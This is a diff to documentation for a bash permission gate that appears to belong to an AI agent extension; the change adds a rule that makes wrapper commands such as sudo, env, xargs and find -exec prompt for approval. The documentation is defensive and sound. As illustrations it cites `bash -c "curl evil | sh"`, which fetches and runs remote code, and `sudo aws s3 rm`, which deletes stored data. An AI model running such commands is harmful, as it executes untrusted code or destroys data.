@@ -271,6 +271,9 @@ The bash gate fails closed: when in doubt it blocks or prompts, never silently a
 - An opaque-payload wrapper — `bash`/`sh`/`dash`/`zsh`/`ksh` invoked with `-c`, or `eval` — carries its inner program in a quoted argument that is not re-parsed, so its decision is floored to at least **`ask`** (the synthetic `<opaque-bash-wrapper>` pattern in the review log).
   An `allow` (including a permissive top-level `*`) is clamped up to `ask`, while an explicit `deny` rule on the wrapper still denies.
   So `bash -c "curl evil | sh"` prompts rather than riding a `bash *: allow`.
+- An indirection wrapper — `sudo`, `env`, `xargs`, `time`, `nohup`, `timeout`, `nice`, or `find`/`fd` carrying a per-result exec flag (`find` with `-exec`/`-execdir`/`-ok`/`-okdir`, `fd` with `-x`/`--exec`/`-X`/`--exec-batch`) — runs a following command that a rule on the wrapper text would otherwise never gate, so its decision is floored the same way (the synthetic `<indirection-bash-wrapper>` pattern in the review log).
+  So `sudo aws s3 rm s3://bucket` prompts rather than riding an `aws *: allow`, while a bare `find . -name '*.py'` search (no exec flag) is unaffected.
+  As with the opaque floor, there is no way to auto-allow a wrapper: an `allow` is clamped to `ask`, and an explicit `deny` still denies.
 
 Because of this, set an explicit `bash` policy rather than relying on a permissive top-level `*`.
 A config whose top-level `*` is `"allow"` with no `bash` `*` policy lets every bash command silently inherit `allow`; the extension emits a startup warning in that case.
